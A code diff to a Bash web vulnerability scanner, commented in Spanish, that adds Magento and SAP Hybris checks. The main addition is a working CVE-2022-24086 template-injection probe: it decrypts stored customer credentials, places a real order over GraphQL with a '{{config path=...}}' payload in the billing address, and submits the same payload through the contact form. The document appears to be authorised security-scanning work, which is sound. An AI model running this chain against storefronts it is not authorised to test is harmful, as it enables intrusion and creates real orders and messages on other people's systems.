@@ -858,7 +858,198 @@ _scan_magento() {
             "Magento" "$SEV" "Template: $TEMPLATE" "nuclei:$TEMPLATE"
         done
     fi
+
+    # CVE-2022-24086: SSTI via order billing address
+    _test_magento_ssti "$DOMAIN_ID" "$DOMAIN" "$BASE"
+
+    # Admin panel en path por defecto
+    local ADMIN_CODE
+    ADMIN_CODE=$(curl -sk -o /dev/null -w "%{http_code}" "${BASE}/admin/")
+    if [[ "$ADMIN_CODE" == "200" ]]; then
+      _cms_finding "$DOMAIN_ID" "$DOMAIN" "$BASE" \
+        "Magento" "low" "Panel de administración accesible en /admin/ (path por defecto)" \
+        "admin_default_path"
+    fi
+
+    # GraphQL introspection habilitada
+    local GQL_CODE
+    GQL_CODE=$(curl -sk -o /dev/null -w "%{http_code}" \
+      -X POST "${BASE}/graphql" \
+      -H "Content-Type: application/json" \
+      -d '{"query":"{__typename}"}')
+    if [[ "$GQL_CODE" == "200" ]]; then
+      local INTRO
+      INTRO=$(curl -sk -X POST "${BASE}/graphql" \
+        -H "Content-Type: application/json" \
+        -d '{"query":"{ __schema { queryType { name } } }"}' | \
+        python3 -c "import sys,json; d=json.load(sys.stdin); print('ok' if d.get('data',{}).get('__schema') else 'no')" 2>/dev/null)
+      if [[ "$INTRO" == "ok" ]]; then
+        _cms_finding "$DOMAIN_ID" "$DOMAIN" "${BASE}/graphql" \
+          "Magento" "low" "GraphQL introspection habilitada — esquema completo accesible" \
+          "graphql_introspection"
+      fi
+    fi
+
   done <<< "$SUBS"
+}
+
+# ── Magento CVE-2022-24086: SSTI via billing address ──────────
+# Intenta colocar una orden con template directive en la dirección
+# de facturación. Si la expresión se evalúa en el email de confirmación
+# (Magento template engine), hay SSTI → posible RCE.
+# Requiere credenciales de cliente en vault (tabla auth_credentials).
+_test_magento_ssti() {
+  local DOMAIN_ID="$1" DOMAIN="$2" BASE="$3"
+  local SUB
+  SUB=$(echo "$BASE" | sed 's|https\?://||;s|/.*||')
+
+  # Buscar credenciales de cliente Magento en vault
+  local CRED_ROW
+  CRED_ROW=$(sqlite3 "$DB_PATH" \
+    "SELECT username, password_enc FROM auth_credentials
+     WHERE domain_id=${DOMAIN_ID}
+       AND subdomain='${SUB//\'/\'\'}' AND valid=1
+     LIMIT 1;" 2>/dev/null)
+  [[ -z "$CRED_ROW" ]] && return
+
+  local USERNAME PASSWORD_ENC
+  IFS='|' read -r USERNAME PASSWORD_ENC <<< "$CRED_ROW"
+  local PASSWORD
+  PASSWORD=$(python3 -c "
+import sys; sys.path.insert(0,'${SCRIPT_DIR}/core')
+from vault import decrypt; print(decrypt('${PASSWORD_ENC//\'/\\\'}'))
+" 2>/dev/null)
+  [[ -z "$PASSWORD" ]] && return
+
+  log_info "  [CVE-2022-24086] Probando SSTI en billing address con cuenta ${USERNAME}"
+
+  # ── 1. Obtener token GraphQL ───────────────────────────────
+  local TOKEN
+  TOKEN=$(curl -sk -X POST "${BASE}/graphql" \
+    -H "Content-Type: application/json" \
+    -d "{\"query\":\"mutation { generateCustomerToken(email: \\\"${USERNAME}\\\", password: \\\"${PASSWORD}\\\") { token } }\"}" | \
+    python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('data',{}).get('generateCustomerToken',{}).get('token',''))" 2>/dev/null)
+  [[ -z "$TOKEN" ]] && return
+
+  # ── 2. Crear carrito ───────────────────────────────────────
+  local CART_ID
+  CART_ID=$(curl -sk -X POST "${BASE}/graphql" \
+    -H "Content-Type: application/json" \
+    -H "Authorization: Bearer ${TOKEN}" \
+    -d '{"query":"mutation { createEmptyCart }"}' | \
+    python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('data',{}).get('createEmptyCart',''))" 2>/dev/null)
+  [[ -z "$CART_ID" ]] && return
+
+  # ── 3. Añadir primer producto disponible al carrito ────────
+  local FIRST_SKU
+  FIRST_SKU=$(curl -sk -X POST "${BASE}/graphql" \
+    -H "Content-Type: application/json" \
+    -d '{"query":"{ products(search: \"a\", pageSize: 1) { items { sku } } }"}' | \
+    python3 -c "import sys,json; d=json.load(sys.stdin); items=d.get('data',{}).get('products',{}).get('items',[]); print(items[0]['sku'] if items else '')" 2>/dev/null)
+  [[ -z "$FIRST_SKU" ]] && return
+
+  curl -sk -X POST "${BASE}/graphql" \
+    -H "Content-Type: application/json" \
+    -H "Authorization: Bearer ${TOKEN}" \
+    -d "{\"query\":\"mutation { addSimpleProductsToCart(input: { cart_id: \\\"${CART_ID}\\\", cart_items: [{ data: { quantity: 1, sku: \\\"${FIRST_SKU}\\\" } }] }) { cart { id } } }\"}" \
+    -o /dev/null 2>/dev/null
+
+  # ── 4. Poner dirección de facturación con payload SSTI ─────
+  # Payload seguro: config path retorna email de la tienda (visible en admin)
+  # No inyectar payloads destructivos
+  local SSTI_MARKER="HACKEADORA_SSTI_$(date +%s)"
+  local SSTI_PAYLOAD="{{config path=\"trans_email/ident_general/email\"}} ${SSTI_MARKER}"
+
+  curl -sk -X POST "${BASE}/graphql" \
+    -H "Content-Type: application/json" \
+    -H "Authorization: Bearer ${TOKEN}" \
+    -d "{\"query\":\"mutation { setBillingAddressOnCart(input: { cart_id: \\\"${CART_ID}\\\", billing_address: { address: { firstname: \\\"Test\\\", lastname: \\\"User\\\", street: [\\\"${SSTI_PAYLOAD//\"/\\\"}\\\"], city: \\\"Sydney\\\", region: { region_id: 570 }, country_code: \\\"AU\\\", postcode: \\\"2000\\\", telephone: \\\"0400000000\\\" } } }) { cart { id } } }\"}" \
+    -o /dev/null 2>/dev/null
+
+  # ── 5. Establecer método de pago y colocar orden ───────────
+  local PAYMENT_METHOD
+  PAYMENT_METHOD=$(curl -sk -X POST "${BASE}/graphql" \
+    -H "Content-Type: application/json" \
+    -H "Authorization: Bearer ${TOKEN}" \
+    -d "{\"query\":\"{ cart(cart_id: \\\"${CART_ID}\\\") { available_payment_methods { code } } }\"}" | \
+    python3 -c "import sys,json; d=json.load(sys.stdin); methods=d.get('data',{}).get('cart',{}).get('available_payment_methods',[]); print(methods[0]['code'] if methods else 'free')" 2>/dev/null)
+  [[ -z "$PAYMENT_METHOD" ]] && PAYMENT_METHOD="free"
+
+  curl -sk -X POST "${BASE}/graphql" \
+    -H "Content-Type: application/json" \
+    -H "Authorization: Bearer ${TOKEN}" \
+    -d "{\"query\":\"mutation { setPaymentMethodOnCart(input: { cart_id: \\\"${CART_ID}\\\", payment_method: { code: \\\"${PAYMENT_METHOD}\\\" } }) { cart { id } } }\"}" \
+    -o /dev/null 2>/dev/null
+
+  local ORDER_NUM
+  ORDER_NUM=$(curl -sk -X POST "${BASE}/graphql" \
+    -H "Content-Type: application/json" \
+    -H "Authorization: Bearer ${TOKEN}" \
+    -d "{\"query\":\"mutation { placeOrder(input: { cart_id: \\\"${CART_ID}\\\" }) { order { order_number } } }\"}" | \
+    python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('data',{}).get('placeOrder',{}).get('order',{}).get('order_number',''))" 2>/dev/null)
+
+  if [[ -n "$ORDER_NUM" ]]; then
+    # ── 6. Registrar finding — la confirmación llega por email ─
+    _cms_finding "$DOMAIN_ID" "$DOMAIN" "$BASE" \
+      "Magento" "critical" \
+      "CVE-2022-24086 — SSTI payload almacenado en order ${ORDER_NUM} billing address street. " \
+      "Marker: ${SSTI_MARKER}. " \
+      "Si el email de confirmación incluye el email de la tienda en lugar del texto literal '{{config...}}', el template engine está evaluando input del usuario → RCE. " \
+      "Ver: https://nvd.nist.gov/vuln/detail/CVE-2022-24086" \
+      "magento_ssti_cve_2022_24086"
+
+    log_warn "  🚨 [CRITICAL] CVE-2022-24086 payload almacenado en orden ${ORDER_NUM}"
+    log_info "  Marker: ${SSTI_MARKER} — comprueba si el email de confirmación evalúa {{config...}}"
+
+    _telegram_send "🚨 *CVE-2022-24086 SSTI — Magento*
+🌐 \`${BASE}\`
+📦 Orden: \`${ORDER_NUM}\`
+🔍 Marker: \`${SSTI_MARKER}\`
+⚠️ Si el email de confirmación muestra el email de la tienda en vez del texto literal, hay SSTI → RCE
+📅 $(date '+%Y-%m-%d %H:%M:%S')" 2>/dev/null || true
+  else
+    log_info "  [CVE-2022-24086] Orden no colocada (checkout deshabilitado o error) — probando contact form"
+    _test_magento_ssti_contact "$DOMAIN_ID" "$DOMAIN" "$BASE"
+  fi
+
+  # También probar el contact form como vector SSTI sincrónico
+  _test_magento_ssti_contact "$DOMAIN_ID" "$DOMAIN" "$BASE"
+}
+
+# ── SSTI via contact form (envío síncrono — respuesta inmediata) ─
+_test_magento_ssti_contact() {
+  local DOMAIN_ID="$1" DOMAIN="$2" BASE="$3"
+
+  local CONTACT_URL="${BASE}/contact/index/post/"
+  local FORM_PAGE
+  FORM_PAGE=$(curl -skL --max-time 10 "${BASE}/contact/" 2>/dev/null)
+  [[ -z "$FORM_PAGE" ]] && return
+
+  local FORM_KEY
+  FORM_KEY=$(echo "$FORM_PAGE" | grep -oP 'form_key.*?value="\K[^"]+' | head -1)
+  [[ -z "$FORM_KEY" ]] && return
+
+  local MARKER="HACKEADORA_CONTACT_$(date +%s)"
+
+  local STATUS
+  STATUS=$(curl -sk -X POST "$CONTACT_URL" \
+    -H "Content-Type: application/x-www-form-urlencoded" \
+    -H "Referer: ${BASE}/contact/" \
+    --data-urlencode "form_key=${FORM_KEY}" \
+    --data-urlencode "name=Security Test" \
+    --data-urlencode "email=security@hackeadora.local" \
+    --data-urlencode "telephone=0000000000" \
+    --data-urlencode "comment={{config path=\"trans_email/ident_general/email\"}} ${MARKER}" \
+    -o /dev/null -w "%{http_code}" 2>/dev/null)
+
+  if [[ "$STATUS" == "302" || "$STATUS" == "200" ]]; then
+    _cms_finding "$DOMAIN_ID" "$DOMAIN" "$CONTACT_URL" \
+      "Magento" "high" \
+      "SSTI via contact form — payload '{{config path=...}}' enviado (marker: ${MARKER}). " \
+      "Si el email recibido por el admin contiene el email de la tienda en vez del texto literal, el template engine evalúa input del usuario." \
+      "magento_ssti_contact_form"
+    log_warn "  🔴 [HIGH] SSTI payload enviado por contact form — marker: ${MARKER}"
+  fi
 }
 
 # ── Apache Struts ─────────────────────────────────────────────
@@ -1075,13 +1266,21 @@ _scan_hybris() {
     done
 
     # Backoffice (gestión de catálogo/pedidos)
-    local BO_STATUS
-    BO_STATUS=$(curl -sk -A "${SCAN_UA:-Mozilla/5.0}" --max-time 8 ${CURL_PROXY} \
-      -o /dev/null -w "%{http_code}" -L "${BASE}/backoffice/" 2>/dev/null)
+    local BO_STATUS BO_BODY BO_HEADERS
+    BO_HEADERS=$(curl -sk -A "${SCAN_UA:-Mozilla/5.0}" --max-time 8 ${CURL_PROXY} \
+      -D - -o /tmp/.bo_body_$$ -w "" -L "${BASE}/backoffice/" 2>/dev/null)
+    BO_STATUS=$(echo "$BO_HEADERS" | grep -oP '(?<=HTTP/\S\s)\d+' | tail -1)
+    BO_BODY=$(cat /tmp/.bo_body_$$ 2>/dev/null | head -c 3000)
+    rm -f /tmp/.bo_body_$$
     if [[ "$BO_STATUS" == "200" ]]; then
-      _cms_finding "$DOMAIN_ID" "$DOMAIN" "${BASE}/backoffice/" \
-        "SAP Hybris Backoffice Exposed" "critical" \
-        "Backoffice de administración accesible" "hybris_backoffice"
+      # Descartar SPAs CSR y CF Access — devuelven 200 para todas las rutas
+      if ! is_cf_access_response "$BO_HEADERS" && \
+         ! is_spa_csr_body "$BO_BODY" && \
+         ! is_same_as_root "$BASE" "$BO_BODY" "$CURL_PROXY"; then
+        _cms_finding "$DOMAIN_ID" "$DOMAIN" "${BASE}/backoffice/" \
+          "SAP Hybris Backoffice Exposed" "critical" \
+          "Backoffice de administración accesible" "hybris_backoffice"
+      fi
     fi
 
     # SAML metadata — puede revelar entityID, certificados y URLs internas
